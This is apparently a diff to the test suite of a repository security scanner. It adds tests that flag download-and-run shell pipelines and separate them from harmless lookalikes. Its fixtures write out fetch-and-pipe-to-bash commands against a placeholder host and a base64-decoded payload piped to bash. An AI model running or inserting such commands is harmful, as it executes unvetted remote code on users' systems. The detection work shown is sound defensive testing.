@@ -47,9 +47,13 @@ def behavior(identifier="exec/shell/exec", rule="calls_shell", severity="MEDIUM"
     }
 
 
-def identity(contents):
+def identity(contents, shell_pipe=False):
     data = contents.encode() if isinstance(contents, str) else contents
-    return {"sha256": hashlib.sha256(data).hexdigest(), "size": len(data)}
+    return {
+        "sha256": hashlib.sha256(data).hexdigest(),
+        "size": len(data),
+        "shell_pipe": shell_pipe,
+    }
 
 
 def report(manifest, behaviors=None):
@@ -231,6 +235,24 @@ class SnapshotTests(GitFixture):
         self.assertEqual(manifest["empty.txt"], identity(b""))
         self.assertFalse((destination / "empty.txt").exists())
 
+    def test_snapshot_confirms_complete_literal_shell_command_tokens(self):
+        cases = {
+            "direct.sh": ("curl https://example.invalid/install.sh | bash\n", True),
+            "absolute.sh": (
+                "curl https://example.invalid/install.sh | /bin/sh -s\n",
+                True,
+            ),
+            "hash.sh": ("curl https://example.invalid/archive | sha224sum\n", False),
+            "prefix.sh": ("curl https://example.invalid/archive | bashful\n", False),
+        }
+        for name, (contents, _) in cases.items():
+            self.write(name, contents)
+        self.sha = self.commit()
+        _, manifest = self.snapshot()
+        for name, (_, expected) in cases.items():
+            with self.subTest(name=name):
+                self.assertIs(manifest[name]["shell_pipe"], expected)
+
     def test_head_change_during_scan_cannot_produce_success(self):
         def change_head(*_arguments):
             self.write("README.md", "Changed while scan was in progress\n")
@@ -297,17 +319,39 @@ class PolicyTests(unittest.TestCase):
                 with self.assertRaises(scanner.ScanError):
                     scanner.evaluate(data, self.manifest)
 
-    def test_shell_pipeline_category_blocks_despite_rule_name_deduplication(self):
+    def test_download_shell_pipeline_blocks_despite_rule_name_deduplication(self):
+        manifest = {"ci/build.sh": identity(CLEAN_SCRIPT, shell_pipe=True)}
         for rule in ("pipe_to_shell", "replacement_rule_name"):
-            dangerous = behavior("exec/shell/pipe_sh", rule)
+            dangerous = [
+                behavior("exec/shell/pipe_sh", rule),
+                behavior("c2/tool_transfer/shell", "sleep_rm"),
+            ]
             with self.subTest(rule=rule):
-                self.assertTrue(
-                    scanner.evaluate(report(self.manifest, [dangerous]), self.manifest)
+                self.assertTrue(scanner.evaluate(report(manifest, dangerous), manifest))
+        for categories in (
+            [behavior("exec/shell/pipe_sh", "pipe_to_shell")],
+            [behavior("c2/tool_transfer/shell", "dev_null_rm")],
+        ):
+            with self.subTest(categories=categories):
+                self.assertEqual(
+                    scanner.evaluate(report(manifest, categories), manifest), []
                 )
-        ordinary = behavior("c2/tool_transfer/shell", "dev_null_rm")
         self.assertEqual(
-            scanner.evaluate(report(self.manifest, [ordinary]), self.manifest), []
+            scanner.evaluate(report(self.manifest, dangerous), self.manifest), []
         )
+
+    def test_shell_token_evidence_requires_a_boolean_from_the_snapshot(self):
+        data = report(self.manifest)
+        for value in (None, 0, "true"):
+            manifest = copy.deepcopy(self.manifest)
+            manifest["ci/build.sh"]["shell_pipe"] = value
+            with self.subTest(value=value):
+                with self.assertRaises(scanner.ScanError):
+                    scanner.evaluate(data, manifest)
+        manifest = copy.deepcopy(self.manifest)
+        manifest["ci/build.sh"].pop("shell_pipe")
+        with self.assertRaises(scanner.ScanError):
+            scanner.evaluate(data, manifest)
 
     def test_credential_upload_requires_both_indicators_in_the_same_file(self):
         credential = behavior("credential/cloud/aws", "aws_folder")
@@ -672,10 +716,22 @@ class RealImageTests(GitFixture):
         self.write("pom.xml", "<project><modelVersion>4.0.0</modelVersion></project>\n")
         self.write(".hidden/config", "fixture=true\n")
         self.write("empty.txt", "")
+        self.write(
+            "HashTest.java",
+            'class HashTest {\n  // echo -n "input string" | sha224sum\n}\n',
+        )
+        self.write(
+            "ci/checksum.sh",
+            "#!/bin/sh\ncurl -fsSL https://example.invalid/archive.tar.gz | sha224sum\n",
+        )
+        self.write(
+            "ci/prefix.sh",
+            "#!/bin/sh\ncurl -fsSL https://example.invalid/archive.tar.gz | bashful\n",
+        )
         self.sha = self.commit()
         outcome = self.audit()
         self.assertEqual(outcome["findings"], [])
-        self.assertEqual(outcome["file_count"], 4)
+        self.assertEqual(outcome["file_count"], 7)
 
     def test_shell_and_embedded_pom_commands_are_scanned_as_inert_data(self):
         encoded = "printf 'ZWNobyBmaXh0dXJlCg==' | base64 --decode | bash"
